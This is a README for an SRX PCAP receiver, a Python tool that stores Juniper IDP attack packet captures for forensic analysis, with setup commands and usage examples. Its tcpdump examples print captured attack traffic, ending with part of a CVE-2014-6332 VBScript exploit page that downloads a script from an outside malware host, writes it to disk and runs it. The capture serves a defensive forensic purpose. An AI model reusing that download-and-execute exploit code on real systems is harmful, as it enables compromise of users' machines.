# SRX PCAP Receiver
Open Source IDP PCAP receiver originally created by Oscar Ibatullin.

Used as an alternative to Security Director/JSA/STRM/QRadar for collecting SRX IDP Attack Packets (PCAP) for forensic analysis/incident response.

# Installation instructions
Configure SRX to forward IDP Attack packets (pre and post) to the collector's IP address. The script listens on UDP port 2050 by default but you can change this.
```
set security idp sensor-configuration packet-log source-address 'your_source_address'
set security idp sensor-configuration packet-log host 'the_collector's_ip_address'
set security idp sensor-configuration packet-log host port 2050 
```

If using routing-instances for dataplane connectivity to the collector, you'll need to setup a next-table statement from inet.0
```
set routing-options static route 'the_collector's_ip_address' next-table 'your_instance.inet.0'
```

Enable IDP Packet logging on the IDP policy of your choosing
```
set security idp idp-policy 'your_IDP_Policy' rulebase-ips rule 'your_rule' then notification packet-log pre-attack 2
set security idp idp-policy 'your_IDP_Policy' rulebase-ips rule 'your_rule' then notification packet-log post-attack 2
set security idp idp-policy 'your_IDP_Policy' rulebase-ips rule 'your_rule' then notification packet-log post-attack-timeout 5
```

Install script dependencies on the linux collector (Python 2.7 - Ubuntu Server 16.04)

Ubuntu Packages
```
sudo apt-get install python2.7 python-pip python-dpkt
```

Python 2.7 packages
  ```
pip install twisted
  ```

# Usage instructions

Thankfully, usage is quite simple. The tool will create a directory called 'Juniper_IDP_PCAP_Storage' in the directory the script is executed from.
To execute and background the script, run:
```
$ python2.7 srx_pcap_receiver.py &
```

 When the script receives its first PCAP from the SRX, it will create the directory mentioned above.

Each signature is stored within its own subdirectory, like so:
```
admin@ubuntu16:~/Juniper_IDP_PCAP_Storage$ ls -lah
total 36K
drwxrwxr-x 2 admin admin 4.0K Jan 14 09:25 DNS:MS-FOREFRONT-RCE
drwxrwxr-x 2 admin admin 4.0K Jan 19 18:48 HTTP:MISC:CVE-2014-6332-OF
drwxrwxr-x 2 admin admin 4.0K Jan 14 08:17 HTTP:STC:HIDDEN-IFRAME-2
drwxrwxr-x 2 admin admin 4.0K Jan 14 08:17 HTTP:STC:IE:CVE-2016-3351-ID
drwxrwxr-x 2 admin admin 4.0K Jan 13 16:49 HTTP:STC:JAVA:APPLET-CLASS-FILE
drwxrwxr-x 2 admin admin 4.0K Jan 13 16:49 SHELLCODE:WIN:SHIKATAGANAI-80S
drwxrwxr-x 2 admin admin 4.0K Jan 13 16:59 SHELLCODE:X86:DWORD-ADITIVE-80S

```

Navigate to the signature you'd like to analyze

```
admin@ubuntu16:~/Juniper_IDP_PCAP_Storage$ cd HTTP\:STC\:JAVA\:APPLET-CLASS-FILE/
admin@ubuntu16:~/Juniper_IDP_PCAP_Storage/HTTP:STC:JAVA:APPLET-CLASS-FILE$ ls -lah
total 12K
-rw-rw-r-- 1 admin admin  672 Jan 13 16:49 1484344180-229-2.pcap
```

Transfer and/or analyze with your favourite packet-analysis tool (Wireshark, tcpdump, tshark, etc). 
```
admin@ubuntu16:~/Juniper_IDP_PCAP_Storage/HTTP:STC:JAVA:APPLET-CLASS-FILE$ tcpdump -r 1484344180-229-2.pcap -vv

reading from file 1484344180-229-2.pcap, link-type EN10MB (Ethernet)
-5:00:00.000000 IP (tos 0x0, ttl 51, id 59053, offset 0, flags [none], proto TCP (6), length 40)
    vhost.phx1.nearlyfreespeech.net.http > 10.1.1.10.63009: Flags [.], cksum 0x5e13 (correct), seq 3215153248, ack 4131619491, win 31461, length 0
-5:00:00.010000 IP (tos 0x0, ttl 51, id 59056, offset 0, flags [none], proto TCP (6), length 478)
    vhost.phx1.nearlyfreespeech.net.http > 10.1.1.10.63009: Flags [P.], cksum 0x0704 (correct), seq 0:438, ack 1, win 32120, length 438: HTTP, length: 438
	HTTP/1.1 200 OK
	Last-Modified: Fri, 09 Nov 2012 05:34:59 GMT
	Accept-Ranges: bytes
	Content-Length: 129
	Content-Type: text/html; charset=UTF-8
	Date: Fri, 13 Jan 2017 21:49:40 GMT
	Server: Apache
	ETag: "81-4ce094fff46c0"
	Age: 0
	Via: 1.1 vhost.phx5.nearlyfreespeech.net (squid)
	Connection: keep-alive
	
	<html><head></head><body><applet archive="java_jre17_exec.jar" code="Exploit.class" width="1" height="1"></applet></body></html>
-5:00:00.020000 IP (tos 0x0, ttl 128, id 1498, offset 0, flags [DF], proto TCP (6), length 40)
    10.1.1.10.63009 > vhost.phx1.nearlyfreespeech.net.http: Flags [.], cksum 0xde07 (correct), seq 1, ack 438, win 63802, length 0
```

If you are searching for a specific PCAP in reference to an IDP_ATTACK_LOG_EVENT that Security Director and/or your SIEM has identified, you can correlate that log to its PCAP counterpart by looking for the packet-log-id value within the syslog message (5th last field).

As an example, if I am attempting to locate the PCAP for the event below, I would look first for the directory of the signature  (HTTP:MISC:CVE-2014-6332-OF), and then identify the packet-log of interest (ls -lah | grep 460). The name of each PCAP has the packet-log-id appended to it after the epoch time. It's also possible to search for just the epoch-time listed in the syslog message as well (1484869672).
```
2017-01-19T23:47:58.570Z SRX1500-A RT_IDP - IDP_ATTACK_LOG_EVENT [junos@2636.1.1.1.2.137 epoch-time="1484869672" message-type="SIG" source-address="10.1.1.10" source-port="61478" destination-address="208.94.116.21" destination-port="80" protocol-name="TCP" service-name="SERVICE_IDP" application-name="HTTP" rule-name="3" rulebase-name="IPS" policy-name="Space-IPS-Policy" export-id="17908" repeat-count="0" action="DROP" threat-severity="HIGH" attack-name="HTTP:MISC:CVE-2014-6332-OF" nat-source-address="192.168.0.10" nat-source-port="0" nat-destination-address="0.0.0.0" nat-destination-port="0" elapsed-time="0" inbound-bytes="0" outbound-bytes="0" inbound-packets="0" outbound-packets="0" source-zone-name="Inside" source-interface-name="reth1.0" destination-zone-name="Outside" destination-interface-name="reth0.0" packet-log-id="460" alert="no" username="N/A" roles="N/A" message="-"]
```

```
admin@ubuntu16:~/Juniper_IDP_PCAP_Storage/HTTP:MISC:CVE-2014-6332-OF$ ls -lah | grep 460
-rw-rw-r-- 1 admin admin 1.9K Jan 19 18:48 1484869672-460-2.pcap
```
```
admin@ubuntu16:~/Juniper_IDP_PCAP_Storage/HTTP:MISC:CVE-2014-6332-OF$ ls -lah |grep 1484869672
-rw-rw-r-- 1 admin admin 1.9K Jan 19 18:48 1484869672-460-2.pcap
```
Or, perhaps the most straight forward way is to use find to recursively search the entire PCAP Storage directory for the specific epoch time and feed it into tcpdump in one go. In the instance below, we're looking for the following event with an Epoch time of 1486656762 and a packet-log-id of 4685 and wish to display it in ASCII mode without resolving hostnames (-nnAvv).
```
admin@ubuntu16:~/Juniper_IDP_PCAP_Storage$ find . -name 1486656762-4685* | xargs -t -I file tcpdump -r file -nnAvv

reading from file ./HTTP:MISC:CVE-2014-6332-OF/1486656762-4685-2.pcap, link-type EN10MB (Ethernet)
-5:00:00.000000 IP (tos 0x0, ttl 51, id 12600, offset 0, flags [none], proto TCP (6), length 336)
    208.94.116.21.80 > 10.1.1.10.51137: Flags [P.], cksum 0xbfb7 (correct), seq 141640169:141640465, ack 54246441, win 32120, length 296: HTTP, length: 296
	HTTP/1.1 200 OK
	Last-Modified: Tue, 17 Mar 2015 04:56:42 GMT
	Accept-Ranges: bytes
	Content-Length: 4045
	Content-Type: text/html; charset=UTF-8
	Date: Thu, 09 Feb 2017 16:12:42 GMT
	Server: Apache
	ETag: "fcd-51174caf43e24"
	Via: 1.1 vhost.phx2.nearlyfreespeech.net:3128 (squid/2.7.STABLE7)
	
E..P18..3....^t.
..
.P...qA..;.)P.}x....HTTP/1.1 200 OK
Last-Modified: Tue, 17 Mar 2015 04:56:42 GMT
Accept-Ranges: bytes
Content-Length: 4045
Content-Type: text/html; charset=UTF-8
Date: Thu, 09 Feb 2017 16:12:42 GMT
Server: Apache
ETag: "fcd-51174caf43e24"
Via: 1.1 vhost.phx2.nearlyfreespeech.net:3128 (squid/2.7.STABLE7)


-5:00:00.010000 IP (tos 0x0, ttl 51, id 12604, offset 0, flags [none], proto TCP (6), length 1500)
    208.94.116.21.80 > 10.1.1.10.51137: Flags [P.], seq 296:1756, ack 1, win 32120, length 1460: HTTP
E...1<..3..b.^t.
..
.P...qC..;.)P.}xw...<!doctype html>
<html>
<meta http-equiv="X-UA-Compatible" content="IE=EmulateIE8" >
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
<body>
<script language="VBScript">
function runaaaa()
On Error Resume Next

set xmlhttp = CreateObject("Microsoft.XMLHTTP")
xmlhttp.open "GET", "http://malware.wicar.org/data/ms14_064_ole_xp.gif", False
xmlhttp.send

Set objFSO=CreateObject("Scripting.FileSystemObject")
folder = objFSO.GetSpecialFolder(2)
scriptName = folder + "\HuvP.vbs"
Set objFile = objFSO.CreateTextFile(scriptName,True)
objFile.Write xmlhttp.responseText
objFile.Close

set shell=createobject("Shell.Application")
shell.ShellExecute "wscript.exe", scriptName, "", "open", 0

end function
</script>
<script language="VBScript">

dim   aa()
dim   ab()
dim   a0
dim   a1
dim   a2
dim   a3
dim   win9x
dim   intVersion
dim   rnda
dim   funclass
dim   myarray

Begin()

function Begin()
  On Error Resume Next
  info=Navigator.UserAgent

  if(instr(info,"Win64")>0)   then
     exit   function
  end if

  if (instr(info,"MSIE")>0)   then
             intVersion = CInt(Mid(info, InStr(info, "MSIE") + 5, 2))
  else
     exit   function

  end if

  win9x=0

  BeginInit()
  If Create()=True Then
     myarray=        chrw(01)&chrw(2176)&chrw(01)&chrw(00)&chrw(00)&chrw(00)&chrw(00)&chrw(00)
     myarray=myarray&chrw(00)&chrw(32767)&chrw(00)&chrw(0)

     if(intVersion<4) then
         document.write("<br> IE")

```

